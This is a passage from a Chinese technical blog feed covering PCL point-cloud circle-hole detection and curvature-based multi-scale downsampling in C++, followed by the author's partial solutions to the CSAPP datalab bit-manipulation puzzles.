pcl::ExtractIndices&lt;pcl::PointXYZ&gt;extract;</span><br><span class="line">    extract.<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">    extract.<span class="built_in">setIndices</span>(indexes);</span><br><span class="line">    extract.<span class="built_in">setNegative</span>(<span class="literal">true</span>);</span><br><span class="line">    extract.<span class="built_in">filter</span>(*cloud);<span class="comment">//保存点云</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="2-5代码实现"><a href="#2-5代码实现" class="headerlink" title="2.5代码实现"></a>2.5代码实现</h2><p>代码汇总：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pcl/sample_consensus/sac_model_circle3d.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pcl/segmentation/extract_clusters.h&gt;</span><span class="comment">//提取聚类</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pcl/filters/crop_box.h&gt;</span><span class="comment">//包围盒</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pcl/segmentation/sac_segmentation.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pcl/filters/extract_indices.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ExtractCircle</span><span class="params">(<span class="type">const</span> pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr &amp;cloud)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        pcl::search::KdTree&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">kd_tree</span><span class="params">(<span class="keyword">new</span> pcl::search::KdTree&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">        kd_tree-&gt;<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">        <span class="comment">//聚类</span></span><br><span class="line">        std::vector&lt;pcl::PointIndices&gt;cluster_indices;</span><br><span class="line">        pcl::EuclideanClusterExtraction&lt;pcl::PointXYZ&gt;ec;</span><br><span class="line">        ec.<span class="built_in">setClusterTolerance</span>(<span class="number">0.2</span>);</span><br><span class="line">        ec.<span class="built_in">setMinClusterSize</span>(<span class="number">20</span>);</span><br><span class="line">        ec.<span class="built_in">setMaxClusterSize</span>(cloud-&gt;<span class="built_in">size</span>());</span><br><span class="line">        ec.<span class="built_in">setSearchMethod</span>(kd_tree);</span><br><span class="line">        ec.<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">        ec.<span class="built_in">extract</span>(cluster_indices);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//RANSAC拟合</span></span><br><span class="line">        pcl::SACSegmentationFromNormals&lt;pcl::PointXYZ,pcl::Normal&gt;seg;</span><br><span class="line">        pcl::<span class="function">ModelCoefficients::Ptr <span class="title">coefficients</span> <span class="params">(<span class="keyword">new</span> pcl::ModelCoefficients)</span></span>;<span class="comment">//创建索引对象</span></span><br><span class="line">        pcl::<span class="function">PointIndices::Ptr <span class="title">inliers</span> <span class="params">(<span class="keyword">new</span> pcl::PointIndices)</span></span>;</span><br><span class="line">        std::vector&lt;pcl::ModelCoefficients&gt;coeff;</span><br><span class="line">    </span><br><span class="line">        <span class="type">int</span> counti=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp; indices : cluster_indices)</span><br><span class="line">        &#123;</span><br><span class="line">                pcl::PointCloud&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">cluster</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">                pcl::PointCloud&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">cloud_cir</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">                pcl::<span class="built_in">copyPointCloud</span>(*cloud,indices.indices,*cluster);</span><br><span class="line">                pcl::PointCloud&lt;pcl::Normal&gt;::<span class="function">Ptr <span class="title">normals</span> <span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::Normal&gt;)</span></span>;</span><br><span class="line">            	<span class="comment">//	估计法向量</span></span><br><span class="line">                pcl::search::KdTree&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">tree</span><span class="params">(<span class="keyword">new</span> pcl::search::KdTree&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">                pcl::NormalEstimation&lt;pcl::PointXYZ, pcl::Normal&gt; ne;</span><br><span class="line">                ne.<span class="built_in">setInputCloud</span>(cluster);</span><br><span class="line">                ne.<span class="built_in">setSearchMethod</span>(tree);</span><br><span class="line">                ne.<span class="built_in">setRadiusSearch</span>(<span class="number">0.01</span>);</span><br><span class="line">                ne.<span class="built_in">compute</span>(*normals);</span><br><span class="line">				<span class="comment">//RANSAC</span></span><br><span class="line">                seg.<span class="built_in">setOptimizeCoefficients</span>(<span class="literal">true</span>);</span><br><span class="line">                seg.<span class="built_in">setModelType</span>(pcl::SACMODEL_CIRCLE3D);<span class="comment">//拟合3D圆</span></span><br><span class="line">                seg.<span class="built_in">setMethodType</span>(pcl::SAC_RANSAC);<span class="comment">//RANSAC</span></span><br><span class="line">                seg.<span class="built_in">setNormalDistanceWeight</span>(<span class="number">0.9</span>);<span class="comment">//法向量权重</span></span><br><span class="line">                seg.<span class="built_in">setMaxIterations</span>(<span class="number">10000</span>);<span class="comment">//设置最大迭代次数</span></span><br><span class="line">                seg.<span class="built_in">setDistanceThreshold</span>(<span class="number">0.1</span>);<span class="comment">//eps</span></span><br><span class="line">                seg.<span class="built_in">setRadiusLimits</span>(<span class="number">1.5</span>,<span class="number">3</span>);<span class="comment">//添加拟合圆的半径限制，防止拟合过大或过小的圆</span></span><br><span class="line">                seg.<span class="built_in">setInputNormals</span>(normals);<span class="comment">//输入法向量</span></span><br><span class="line">                seg.<span class="built_in">setInputCloud</span>(cluster);<span class="comment">//传入点集</span></span><br><span class="line">                seg.<span class="built_in">segment</span>(*inliers,*coefficients);<span class="comment">//分割</span></span><br><span class="line">            	<span class="comment">//拟合圆的点数限制，因为很容易会拟合半圆，需根据实际的需求调整，防止拟合半圆</span></span><br><span class="line">                <span class="keyword">if</span> (inliers-&gt;indices.<span class="built_in">size</span>() &lt; <span class="number">80</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="comment">//cerr&lt;&lt;&quot;none&quot;&lt;&lt;endl;</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                coeff.<span class="built_in">push_back</span>(*coefficients);</span><br><span class="line">                counti++;</span><br><span class="line">            	<span class="comment">//提取</span></span><br><span class="line">                pcl::ExtractIndices&lt;pcl::PointXYZ&gt; extract;</span><br><span class="line">                extract.<span class="built_in">setInputCloud</span>(cluster);</span><br><span class="line">                extract.<span class="built_in">setIndices</span>(inliers);</span><br><span class="line">                extract.<span class="built_in">setNegative</span>(<span class="literal">false</span>);</span><br><span class="line">                extract.<span class="built_in">filter</span>(*cloud_cir);</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; coeff.<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            	<span class="comment">//提取拟合圆环的中心点坐标</span></span><br><span class="line">                <span class="function">Eigen::Vector3f <span class="title">center</span><span class="params">(coeff.at(i).values[<span class="number">0</span>],coeff.at(i).values[<span class="number">1</span>],coeff.at(i).values[<span class="number">2</span>])</span></span>;</span><br><span class="line">            	<span class="comment">//设置分割的包围盒长宽高，圆环的半径+阈值</span></span><br><span class="line">                <span class="type">float</span> length0 = <span class="built_in">fabs</span>(coeff.<span class="built_in">at</span>(i).values[<span class="number">3</span>])+<span class="number">0.3</span>,width0 = <span class="built_in">fabs</span>(coeff.<span class="built_in">at</span>(i).values[<span class="number">3</span>])+<span class="number">0.3</span>, height0 = <span class="number">5.0</span>;</span><br><span class="line">                <span class="function">Eigen::Vector4f <span class="title">min_pt</span><span class="params">(center.x()-(length0),center.y()-(width0),center.z()-(height0),<span class="number">0</span>)</span></span>;<span class="comment">//半径</span></span><br><span class="line">                <span class="function">Eigen::Vector4f <span class="title">max_pt</span><span class="params">(center.x()+(length0),center.y()+(width0),center.z()+(height0),<span class="number">0</span>)</span></span>;</span><br><span class="line">				</span><br><span class="line">            	<span class="comment">//创建包围盒对象</span></span><br><span class="line">                pcl::CropBox&lt;pcl::PointXYZ&gt;crop;</span><br><span class="line">                crop.<span class="built_in">setMin</span>(min_pt);<span class="comment">//输入最小坐标</span></span><br><span class="line">                crop.<span class="built_in">setMax</span>(max_pt);<span class="comment">//最大坐标</span></span><br><span class="line">                crop.<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">                crop.<span class="built_in">setKeepOrganized</span>(<span class="literal">false</span>);<span class="comment">//提取被删除点的索引则为true</span></span><br><span class="line">                crop.<span class="built_in">setUserFilterValue</span>(<span class="number">0.1f</span>);<span class="comment">//</span></span><br><span class="line">                <span class="function">pcl::IndicesPtr <span class="title">indexes</span><span class="params">(<span class="keyword">new</span> std::vector&lt;<span class="type">int</span>&gt;)</span></span>;</span><br><span class="line">                crop.<span class="built_in">filter</span>(*indexes);</span><br><span class="line">				<span class="comment">//创建分割对象</span></span><br><span class="line">                pcl::ExtractIndices&lt;pcl::PointXYZ&gt;extract;</span><br><span class="line">                extract.<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">                extract.<span class="built_in">setIndices</span>(indexes);</span><br><span class="line">                extract.<span class="built_in">setNegative</span>(<span class="literal">true</span>);</span><br><span class="line">                extract.<span class="built_in">filter</span>(*cloud);<span class="comment">//保存点云</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-6结果"><a href="#2-6结果" class="headerlink" title="2.6结果"></a>2.6结果</h2><p><strong>RANSAC搜索的对象</strong></p>
<img src="/2023/08/06/%E7%82%B9%E4%BA%91%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB-%E5%9C%86%E5%AD%94%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB/image-20230806155049673.png" alt="image-20230806155049673" style="zoom:80%;">

<p><strong>包围盒分割图像</strong></p>
<img src="/2023/08/06/%E7%82%B9%E4%BA%91%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB-%E5%9C%86%E5%AD%94%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB/image-20230806155158365.png" alt="image-20230806155158365" style="zoom:80%;">]]></content>
      <categories>
        <category>点云处理</category>
      </categories>
      <tags>
        <tag>点云</tag>
        <tag>滤波</tag>
        <tag>特征识别</tag>
      </tags>
  </entry>
  <entry>
    <title>点云多尺度滤波</title>
    <url>/2023/09/18/%E7%82%B9%E4%BA%91%E5%A4%9A%E5%B0%BA%E5%BA%A6%E6%BB%A4%E6%B3%A2/</url>
    <content><![CDATA[<h1 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h1><p>在降采样中想要充分保留边界信息，但是采用体素降采样，均匀降采样等，都是对<strong>全局</strong>的点云信息进行降采样，无法做到<strong>分区域</strong>的降采样。因此对点云的<code>曲率</code>进行估计，作为额外的补充信息对点云进行降采样。即对点云做<strong>条件滤波</strong>。曲率信息作为滤波条件。</p>
<p><strong>运行环境：</strong><code>Ubuntu18.04</code> + <code>PCL1.11</code></p>
<h1 id="二、实现"><a href="#二、实现" class="headerlink" title="二、实现"></a>二、实现</h1><p><strong>主要步骤如下：</strong></p>
<ol>
<li>估计点云的法向量和曲率</li>
<li>对点云法向量和曲率进行字段连接</li>
<li>根据曲率大小进行分区域降采样</li>
</ol>
<h2 id="2-1估计点云的法向量和曲率"><a href="#2-1估计点云的法向量和曲率" class="headerlink" title="2.1估计点云的法向量和曲率"></a>2.1估计点云的法向量和曲率</h2><p>利用PCL库对点云的法向量和曲率进行估计。要注意根据实际的情况设置合适的点云<code>邻域半径</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">pcl::NormalEstimationOMP&lt;pcl::PointXYZ,pcl::Normal&gt;n;</span><br><span class="line">pcl::PointCloud&lt;pcl::Normal&gt;::<span class="function">Ptr <span class="title">normals</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::Normal&gt;)</span></span>;</span><br><span class="line">pcl::search::KdTree&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">tree</span><span class="params">(<span class="keyword">new</span> pcl::search::KdTree&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">tree-&gt;<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">n.<span class="built_in">setViewPoint</span>(<span class="number">10</span>,<span class="number">10</span>,<span class="number">10</span>);</span><br><span class="line">n.<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">n.<span class="built_in">setNumberOfThreads</span>(<span class="number">4</span>);</span><br><span class="line">n.<span class="built_in">setSearchMethod</span>(tree);</span><br><span class="line">n.<span class="built_in">setRadiusSearch</span>(<span class="number">1</span>);<span class="comment">//设置邻域半径</span></span><br><span class="line">n.<span class="built_in">compute</span>(*normals);</span><br></pre></td></tr></table></figure>



<h2 id="2-2字段连接"><a href="#2-2字段连接" class="headerlink" title="2.2字段连接"></a>2.2字段连接</h2><p>利用<code>concatenateFields</code>将点云的法向量与曲率信息连接。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">pcl::PointCloud&lt;pcl::PointNormal&gt;::<span class="function">Ptr <span class="title">cnormals</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::PointNormal&gt;)</span></span>;</span><br><span class="line">pcl::<span class="built_in">concatenateFields</span>(*cloud,*normals,*cnormals);<span class="comment">//连接字段</span></span><br></pre></td></tr></table></figure>



<h2 id="2-3分区域滤波"><a href="#2-3分区域滤波" class="headerlink" title="2.3分区域滤波"></a>2.3分区域滤波</h2><p>设置合理的曲率阈值<code>cur_threshold</code>，遍历点云，将点云放入不同的点云集合<code>clouddownsample_1</code>和<code>clouddownsample_2</code>，分别设置不同的降采样尺度。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">pcl::PointCloud&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">clouddownsample_1</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line">pcl::PointCloud&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">clouddownsample_2</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; cnormals-&gt;points.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">  <span class="keyword">if</span> (cnormals-&gt;<span class="built_in">at</span>(i).curvature &gt; cur_threshold)&#123;<span class="comment">//阈值判断</span></span><br><span class="line">    clouddownsample_1-&gt;points.<span class="built_in">emplace_back</span>(cloud-&gt;points[i]);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    clouddownsample_2-&gt;points.<span class="built_in">emplace_back</span>(cloud-&gt;points[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设置必要的信息</span></span><br><span class="line">clouddownsample_1-&gt;width = clouddownsample_1-&gt;points.<span class="built_in">size</span>();</span><br><span class="line">clouddownsample_1-&gt;height = <span class="number">1</span>;</span><br><span class="line">clouddownsample_1-&gt;is_dense = <span class="literal">true</span>;</span><br><span class="line">clouddownsample_2-&gt;width = clouddownsample_2-&gt;points.<span class="built_in">size</span>();</span><br><span class="line">clouddownsample_2-&gt;height = <span class="number">1</span>;</span><br><span class="line">clouddownsample_2-&gt;is_dense = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//大尺度降采样</span></span><br><span class="line">pcl::PointCloud&lt;pcl::PointXYZ&gt;::<span class="function">Ptr <span class="title">cloud_add</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::PointXYZ&gt;)</span></span>;</span><br><span class="line"><span class="type">float</span> leftSize = <span class="number">0.25f</span>;<span class="comment">//尺度设置</span></span><br><span class="line">pcl::VoxelGrid&lt;pcl::PointXYZ&gt; down;</span><br><span class="line">down.<span class="built_in">setInputCloud</span> (clouddownsample_2);</span><br><span class="line">down.<span class="built_in">setLeafSize</span> (leftSize, leftSize, leftSize);</span><br><span class="line">down.<span class="built_in">filter</span> (*clouddownsample_2);</span><br><span class="line"></span><br><span class="line">*cloud_add = *clouddownsample_1 + *clouddownsample_2;<span class="comment">//合并降采样后的点云</span></span><br></pre></td></tr></table></figure>



<h1 id="三、结果"><a href="#三、结果" class="headerlink" title="三、结果"></a>三、结果</h1><h2 id="3-1原始图像"><a href="#3-1原始图像" class="headerlink" title="3.1原始图像"></a>3.1原始图像</h2><p><img src="/2023/09/18/%E7%82%B9%E4%BA%91%E5%A4%9A%E5%B0%BA%E5%BA%A6%E6%BB%A4%E6%B3%A2/image-20230918150913761.png" alt="原始图像"></p>
<h2 id="3-2曲率估计图像"><a href="#3-2曲率估计图像" class="headerlink" title="3.2曲率估计图像"></a>3.2曲率估计图像</h2><p>曲率高的地方为边界。</p>
<p><img src="/2023/09/18/%E7%82%B9%E4%BA%91%E5%A4%9A%E5%B0%BA%E5%BA%A6%E6%BB%A4%E6%B3%A2/image-20230918151009863.png" alt="曲率估计图像"></p>
<h2 id="3-3降采样图像"><a href="#3-3降采样图像" class="headerlink" title="3.3降采样图像"></a>3.3降采样图像</h2><p>边界信息较好的保留了下来</p>
<p><img src="/2023/09/18/%E7%82%B9%E4%BA%91%E5%A4%9A%E5%B0%BA%E5%BA%A6%E6%BB%A4%E6%B3%A2/image-20230918151106060.png" alt="image-20230918151106060"></p>
<h2 id="3-4不足"><a href="#3-4不足" class="headerlink" title="3.4不足"></a>3.4不足</h2><p>整体对曲率估计时的<code>邻域半径设置</code>比较敏感，若设置过小，极易受到噪声点的干扰，如下图的曲率估计。</p>
<p><img src="/2023/09/18/%E7%82%B9%E4%BA%91%E5%A4%9A%E5%B0%BA%E5%BA%A6%E6%BB%A4%E6%B3%A2/image-20230918151458899.png" alt="image-20230918151458899"></p>
]]></content>
      <categories>
        <category>点云处理</category>
      </categories>
      <tags>
        <tag>滤波</tag>
        <tag>PCL</tag>
        <tag>降采样</tag>
        <tag>多尺度</tag>
        <tag>C++</tag>
        <tag>条件滤波</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-2-datalab</title>
    <url>/2023/10/18/CSAPP-2-datalab/</url>
    <content><![CDATA[<h2 id="2-data-lab"><a href="#2-data-lab" class="headerlink" title="2 data lab"></a>2 data lab</h2><h3 id="2-1-bitXor"><a href="#2-1-bitXor" class="headerlink" title="2.1 bitXor"></a>2.1 bitXor</h3><ul>
<li><p>x^y only use ~ and &amp;</p>
</li>
<li><p>异或：不相同时为1，相同为0——- 计算不是<strong>同时为0情况</strong>和不是<strong>同时为1的情况</strong> 然后进行与</p>
<ul>
<li>例如 x[0011]                        y[0101]</li>
<li><strong>找出同时为1的情况 则 x&amp;y &#x3D; [0001]</strong></li>
<li><strong>找出同时为0的情况 则相反 ~x[1100] &amp; ~y[1010] &#x3D; [1000]</strong></li>
<li>找出这两种单独情况然后再取非 按位与就是异或门实现</li>
</ul>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ~(~x&amp;~y)&amp;~(x&amp;y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-2-tmin"><a href="#2-2-tmin" class="headerlink" title="2.2 tmin"></a>2.2 tmin</h3><ul>
<li><p>only use ！~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
</li>
<li><p>返回最小补码整数</p>
</li>
<li><p>题目要求机器在32位机器上运行  int的类型位32位</p>
</li>
<li><p>补码最小值为 符号位为1 其余为0 即为最小值，因此可以将0X1[00000000,00000000,00000000,00000001] 左移31位。</p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">tmin</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-3-isTmax"><a href="#2-3-isTmax" class="headerlink" title="2.3 isTmax"></a>2.3 isTmax</h3><ul>
<li><p>当输入的数是最大时返回1，其余返回0.</p>
</li>
<li><p>only use <code>!（非）  ~（按位取反） &amp; ^ | +</code></p>
</li>
<li><p>int 32位最大值 符号位为0，其余为1 [01111111,11111111,11111111,11111111] 判断x是否和这个值相等</p>
</li>
<li><p>当Tmax 再增加1时 会变成[1000…..] Tmin </p>
</li>
<li><p>Tmin[1000] 恰好是Tmax[0111] 的反   <strong>除了x &#x3D; -1[1111] 和y &#x3D; 0[0000] 外 都不满足这个规则</strong>，利用[0000] 和[1000]的不相同  让结果直接加上它 </p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">isTmax</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> y = x + <span class="number">1</span>;<span class="comment">//如果x是Tmax[0111] 则 y = Tmin[1000] </span></span><br><span class="line">    x = x + y;<span class="comment">//[1111]</span></span><br><span class="line">    x = ~x;<span class="comment">//[0000]</span></span><br><span class="line">    <span class="keyword">return</span> !（x + !y）; <span class="comment">//如果y=[0000] -&gt;!y=[0001] x + !y = [0001] 最后在取反返回0</span></span><br><span class="line">    				   <span class="comment">//如果y=[1000] -&gt;!y=[0000] x + !y = [0000] 返回1 对答案无影响</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-4-allOddBits"><a href="#2-4-allOddBits" class="headerlink" title="2.4 allOddBits"></a>2.4 allOddBits</h3><ul>
<li><p>如果所有的奇数位都位1 则返回1 [0-31]</p>
</li>
<li><p>only use ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
</li>
<li><p>利用 掩码  关键是 如何提取出x 的奇数位</p>
<ul>
<li>先构造一个 奇数位全为1 的数 即0xAAAAAAAA</li>
<li>任何数与这个数 &amp;后，偶数位全0，奇数位 1的仍然是1， 原来是0的则为0.。</li>
<li><strong>在与这个数[0xAAAAAAAA]进行异或，满足要求则数转换为0，不满足则非0。</strong></li>
</ul>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  	<span class="type">int</span> a = <span class="number">0xaa</span> + (<span class="number">0xaa</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  	<span class="type">int</span> b = a + (a &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  	<span class="keyword">return</span> !((x &amp; b) ^ b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-5-negate"><a href="#2-5-negate" class="headerlink" title="2.5 negate"></a>2.5 negate</h3><ul>
<li><p>求反</p>
</li>
<li><p>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
</li>
<li><p>1[0001]      -1[1111]  阿贝尔群 <strong>取反+1</strong></p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">negate</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (~x + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-6-isAsciiDigit"><a href="#2-6-isAsciiDigit" class="headerlink" title="2.6 isAsciiDigit"></a>2.6 isAsciiDigit</h3><ul>
<li><p>判断是否是ascii数字 0x30 &lt;&#x3D; x &lt;&#x3D;0x39</p>
</li>
<li><p><strong>又上题可得 ~x+1 &#x3D; - x</strong>，因此可以由这个实现减法运算  </p>
<ul>
<li>减去上下界。 上界[0x39] 下界[0x30]    然后再右移31位 判断符号位</li>
</ul>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> upper = (<span class="number">0x39</span> + (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>;<span class="comment">//左移31</span></span><br><span class="line">  <span class="type">int</span> down = (x + (~<span class="number">0x30</span> + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> !upper &amp; !down;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-7-conditional"><a href="#2-7-conditional" class="headerlink" title="2.7 conditional"></a>2.7 conditional</h3><ul>
<li><p><code>x ? y : z</code> 当<code>x 非0</code>时 返回<code> y</code> ，当<code>x = 0</code>时返回 <code>z </code></p>
<ul>
<li>利用<code>x=[0000]</code>（表示0，返回z的情况）时 或x &#x3D;[1111]（表示非0，返回y 的情况）</li>
<li><code>x =~x + 1</code>作用 设置为全0 或全1</li>
<li>例如 x一开始 [0000] 和 [0001]</li>
<li>经过~x 为 [1111] 和 [1110]</li>
<li>+1 为 [0000] 和 [1111]</li>
</ul>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> </span>&#123;</span><br><span class="line">  x = !!x;</span><br><span class="line">  x = ~x + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> (x &amp; y) | (~x &amp; z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-8-isLessOrEqual"><a href="#2-8-isLessOrEqual" class="headerlink" title="2.8 isLessOrEqual"></a>2.8 isLessOrEqual</h3><ul>
<li><p>用位运算 实现 &lt;&#x3D;</p>
</li>
<li><p>比较两个数的大小  两种情况</p>
<ul>
<li>符号不同 整数大</li>
<li>符号相同 看差值符号</li>
</ul>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a = x &gt;&gt; <span class="number">31</span>;<span class="comment">//取符号位</span></span><br><span class="line">  <span class="type">int</span> b = y &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> c = !(a ^ b);<span class="comment">//取非，保证相同为1，不同为0</span></span><br><span 